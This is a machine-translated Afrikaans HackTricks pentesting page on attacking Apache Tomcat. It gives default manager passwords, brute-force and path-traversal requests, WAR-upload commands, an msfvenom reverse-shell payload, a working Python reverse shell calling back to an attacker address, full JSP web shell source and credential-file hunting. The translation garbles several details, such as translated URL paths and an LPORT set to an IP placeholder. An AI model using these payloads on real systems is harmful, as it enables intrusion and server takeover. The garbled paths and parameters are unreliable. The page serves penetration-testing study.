# Tomcat

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy adverteer in HackTricks**? Of wil jy toegang h√™ tot die **nuutste weergawe van die PEASS of laai HackTricks in PDF af**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die [hacktricks-repo](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud-repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Vind kwesbaarhede wat die belangrikste is sodat jy dit vinniger kan regmaak. Intruder volg jou aanvalsoppervlak, voer proaktiewe dreigingsskanderings uit, vind probleme regoor jou hele tegnologie-stapel, van API's tot webtoepassings en wolkstelsels. [**Probeer dit vandag nog gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Ontdekking

* Dit loop gewoonlik op **poort 8080**
* **Gewone Tomcat-fout:**

<figure><img src="../../.gitbook/assets/image (1) (6).png" alt=""><figcaption></figcaption></figure>

## Enumerasie

### **Weergawe-identifikasie**
Om die weergawe van Apache Tomcat te vind, kan 'n eenvoudige opdrag uitgevoer word:
```bash
curl -s http://tomcat-site.local:8080/docs/ | grep Tomcat
```
Hierdie sal soek na die term "Tomcat" in die dokumentasie-indeksbladsy, wat die weergawe in die titel-etiket van die HTML-reaksie sal onthul.

### **Bestandslokasie van die Bestuurder**
Die identifisering van die presiese lokasies van die **`/bestuurder`** en **`/host-bestuurder`** gids is noodsaaklik, aangesien hul name gewysig kan word. 'n Brute-force-soektog word aanbeveel om hierdie bladsye op te spoor.

### **Gebruikersnaam Enumerasie**
Vir Tomcat-weergawes ouer as 6 is dit moontlik om gebruikersname te enumereer deur middel van:
```bash
msf> use auxiliary/scanner/http/tomcat_enum
```
### **Verstek Wagwoorde**
Die **`/bestuurder/html`** gids is besonder sensitief omdat dit die oplaai en implementering van WAR-l√™ers moontlik maak, wat kan lei tot kodering. Hierdie gids word beskerm deur basiese HTTP-verifikasie, met algemene wagwoorde wat insluit:
- admin:admin
- tomcat:tomcat
- admin:<NIKS>
- admin:s3cr3t
- tomcat:s3cr3t
- admin:tomcat

Hierdie wagwoorde kan getoets word deur die volgende te gebruik:
```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
```
'n Ander opmerklike gids is **`/bestuurder/status`**, wat die Tomcat- en OS-weergawe vertoon en help om kwesbaarhede te identifiseer.

### **Brute Force-aanval**
Om 'n brute force-aanval op die bestuursgids te probeer, kan 'n mens gebruik maak van:
```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```
Saam met die instelling van verskeie parameters in Metasploit om 'n spesifieke gasheer te teiken.

## Algemene Kwesbaarhede

### **Wagwoord Terugspoor Openbaarmaking**
Toegang tot `/auth.jsp` kan onder gunstige omstandighede die wagwoord in 'n terugspoor openbaar maak.

### **Dubbele URL-kodering**
Die CVE-2007-1860 kwesbaarheid in `mod_jk` maak dubbele URL-kodering padtraversal moontlik, wat ongemagtigde toegang tot die bestuurskoppelvlak via 'n spesiaal vervaardigde URL moontlik maak.

Om toegang te verkry tot die bestuursweb van die Tomcat, gaan na: `pathTomcat/%252E%252E/manager/html`

### /voorbeelde
Apache Tomcat-weergawes 4.x tot 7.x sluit voorbeeldskripte in wat vatbaar is vir inligtingsoopmaking en kruissite-skripting (XSS) aanvalle. Hierdie skripte, wat volledig gelys word, moet nagegaan word vir ongemagtigde toegang en potensi√´le uitbuiting. Vind [meer inligting hier](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)

* /voorbeelde/jsp/num/numguess.jsp
* /voorbeelde/jsp/dates/date.jsp
* /voorbeelde/jsp/snp/snoop.jsp
* /voorbeelde/jsp/error/error.html
* /voorbeelde/jsp/sessions/carts.html
* /voorbeelde/jsp/checkbox/check.html
* /voorbeelde/jsp/colors/colors.html
* /voorbeelde/jsp/cal/login.html
* /voorbeelde/jsp/include/include.jsp
* /voorbeelde/jsp/forward/forward.jsp
* /voorbeelde/jsp/plugin/plugin.jsp
* /voorbeelde/jsp/jsptoserv/jsptoservlet.jsp
* /voorbeelde/jsp/simpletag/foo.jsp
* /voorbeelde/jsp/mail/sendmail.jsp
* /voorbeelde/servlet/HelloWorldExample
* /voorbeelde/servlet/RequestInfoExample
* /voorbeelde/servlet/RequestHeaderExample
* /voorbeelde/servlet/RequestParamExample
* /voorbeelde/servlet/CookieExample
* /voorbeelde/servlet/JndiServlet
* /voorbeelde/servlet/SessionExample
* /tomcat-docs/appdev/sample/web/hello.jsp

### **Padtraversal-uitbuiting**
In sommige [**kwesbare konfigurasies van Tomcat**](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/) kan jy toegang verkry tot beskermde gids in Tomcat deur die pad te gebruik: `/..;/`

So, byvoorbeeld, kan jy moontlik toegang tot die Tomcat-bestuurderbladsy verkry deur toegang te verkry tot: `www.vulnerable.com/lalala/..;/manager/html`

**'n Ander manier** om beskermde paaie te omseil deur hierdie truuk te gebruik, is om toegang te verkry tot `http://www.vulnerable.com/;param=value/manager/html`


## RCE

Laastens, as jy toegang het tot die Tomcat Web Application Manager, kan jy 'n .war-l√™er oplaai en ontplooi (kode uitvoer).

### Beperkings

Jy sal slegs 'n WAR kan ontplooi as jy **genoeg voorregte** het (rolle: **admin**, **manager** en **manager-script**). Hierdie besonderhede kan gevind word in _tomcat-users.xml_ wat gewoonlik gedefinieer word in `/usr/share/tomcat9/etc/tomcat-users.xml` (dit wissel tussen weergawes) (sien [POST](tomcat.md#post) afdeling).
```bash
# tomcat6-admin (debian) or tomcat6-admin-webapps (rhel) has to be installed

# deploy under "path" context path
curl --upload-file monshell.war -u 'tomcat:password' "http://localhost:8080/manager/text/deploy?path=/monshell"

# undeploy
curl "http://tomcat:Password@localhost:8080/manager/text/undeploy?path=/monshell"
```
### Metasploit

Metasploit is 'n kragtige raamwerk vir penetrasietoetse wat gebruik kan word om verskeie aanvalle uit te voer op 'n doelwitstelsel. Dit bied 'n verskeidenheid van gereedskap en modules wat deur penetrasietoetsers gebruik kan word om swakpunte in 'n stelsel te identifiseer en uit te buit. Metasploit maak gebruik van 'n databasis van bekende swakpunte en aanvalle om die penetrasietoetser te help om suksesvolle aanvalle uit te voer. Dit is 'n baie gewilde hulpmiddel in die hacker-gemeenskap en word gereeld bygewerk met nuwe modules en tegnieke.
```bash
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```
### MSFVenom Omgekeerde Skulp

1. Skep die oorlog om te ontplooi:
```bash
msfvenom -p java/shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LHOST_IP> -f war -o revshell.war
```
2. Laai die `revshell.war` l√™er op en kry toegang daartoe (`/revshell/`):

### Bind en omgekeerde skulp met [tomcatWarDeployer.py](https://github.com/mgeeky/tomcatWarDeployer)

In sommige scenario's werk dit nie (byvoorbeeld ou weergawes van sun)

#### Aflaai
```bash
git clone https://github.com/mgeeky/tomcatWarDeployer.git
```
#### Omgekeerde skul

'n Omgekeerde skul is 'n tegniek wat gebruik word in netwerkpenetrering om 'n verbinding te maak tussen die aanvaller se masjien en die slagoffer se masjien. Hierdie tegniek maak dit moontlik vir die aanvaller om op afstand beheer oor die slagoffer se masjien te verkry.

Om 'n omgekeerde skul te skep, moet die aanvaller 'n skadelike kode op die slagoffer se masjien plaas. Hierdie kode sal dan 'n verbinding maak met die aanvaller se masjien en die beheer oor die slagoffer se masjien oorneem.

'n Omgekeerde skul kan gebruik word om verskeie take uit te voer, soos die verkryging van inligting, die uitvoering van opdragte en die installeer van verdere skadelike sagteware op die slagoffer se masjien.

Hier is 'n voorbeeld van 'n omgekeerde skul in Python:

```python
import socket
import subprocess

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('attacker_ip', attacker_port))
    s.send(b'Connection established')
    
    while True:
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break
        output = subprocess.getoutput(command)
        s.send(output.encode())
    
    s.close()

reverse_shell()
```

In hierdie voorbeeld maak die kode 'n TCP-verbinding met die IP-adres van die aanvaller en 'n spesifieke poort. Dit stuur dan die boodskap "Connection established" na die aanvaller om die suksesvolle verbinding aan te dui.

Die kode wag dan vir opdragte van die aanvaller en voer dit uit op die slagoffer se masjien. Die uitvoer van die opdrag word teruggestuur na die aanvaller.

Dit is belangrik om te onthou dat die gebruik van omgekeerde skultegnieke sonder toestemming van die eienaar van die masjien onwettig is en streng bestraf kan word. Hierdie tegniek moet slegs gebruik word vir wettige doeleindes, soos in die geval van etiese hackers wat toestemming het om netwerke te toets vir sekuriteitskwessies.
```bash
./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/
```
#### Bind skulp

'n Bind skulp is 'n tipe skulp wat gebruik word in netwerkdiens-pentesting om 'n verband te skep tussen die aanvaller se rekenaar en die teikenrekenaar. Hierdie skulp "bind" aan 'n spesifieke poort op die teikenrekenaar en wag vir 'n inkomende verbind. As 'n verbind gevestig word, kan die aanvaller beheer oor die teikenrekenaar verkry en verskeie aksies uitvoer, soos l√™ers oplaai, data verander of sagteware installeer. 'n Bind skulp is 'n nuttige tegniek vir aanvallers om toegang tot 'n teikenrekenaar te verkry en dit te misbruik vir hul eie doeleindes.
```bash
./tomcatWarDeployer.py -U <username> -P <password> -p <bind_port> <victim_IP>:<victim_PORT>/manager/html/
```
### Gebruik [Culsterd](https://github.com/hatRiot/clusterd)
```bash
clusterd.py -i 192.168.1.105 -a tomcat -v 5.5 --gen-payload 192.168.1.6:4444 --deploy shell.war --invoke --rand-payload -o windows
```
### Handleidingsmetode - Web-skulp

Skep **index.jsp** met hierdie [inhoud](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp):
```java
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
String output = "";
if(cmd != null) {
String s = null;
try {
Process p = Runtime.getRuntime().exec(cmd,null,null);
BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
while((s = sI.readLine()) != null) { output += s+"</br>"; }
}  catch(IOException e) {   e.printStackTrace();   }
}
%>
<pre><%=output %></pre>
```

```bash
mkdir webshell
cp index.jsp webshell
cd webshell
jar -cvf ../webshell.war *
webshell.war is created
# Upload it
```
Jy kan ook hierdie installeer (laat oplaai, aflaai en opdrag uitvoer): [http://vonloesch.de/filebrowser.html](http://vonloesch.de/filebrowser.html)

### Handleiding Metode 2

Kry 'n JSP-webshell soos [hierdie](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) en skep 'n WAR-l√™er:
```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
# When this file is uploaded to the manager GUI, the /backup application will be added to the table.
# Go to: http://tomcat-site.local:8180/backup/cmd.jsp
```
## POST

Die naam van die Tomcat-geloofsbriewe-l√™er is _tomcat-users.xml_.
```bash
find / -name tomcat-users.xml 2>/dev/null
```
Ander maniere om Tomcat-geloofsbriewe te versamel:
```bash
msf> use post/multi/gather/tomcat_gather
msf> use post/windows/gather/enum_tomcat
```
## Ander tomcat skandering gereedskap

* [https://github.com/p0dalirius/ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner)

## Verwysings
* [https://github.com/simran-sankhala/Pentest-Tomcat](https://github.com/simran-sankhala/Pentest-Tomcat)
* [https://hackertarget.com/sample/nexpose-metasploitable-test.pdf](https://hackertarget.com/sample/nexpose-metasploitable-test.pdf)


<details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Vind kwesbaarhede wat die belangrikste is sodat jy dit vinniger kan regmaak. Intruder volg jou aanvalsoppervlak, voer proaktiewe dreigingsskanderings uit, vind probleme regoor jou hele tegnologie-stapel, van API's tot webtoepassings en wolkstelsels. [**Probeer dit vandag nog gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersekuriteitsmaatskappy**? Wil jy jou **maatskappy adverteer in HackTricks**? Of wil jy toegang h√™ tot die **nuutste weergawe van die PEASS of laai HackTricks in PDF af**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die [hacktricks repo](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
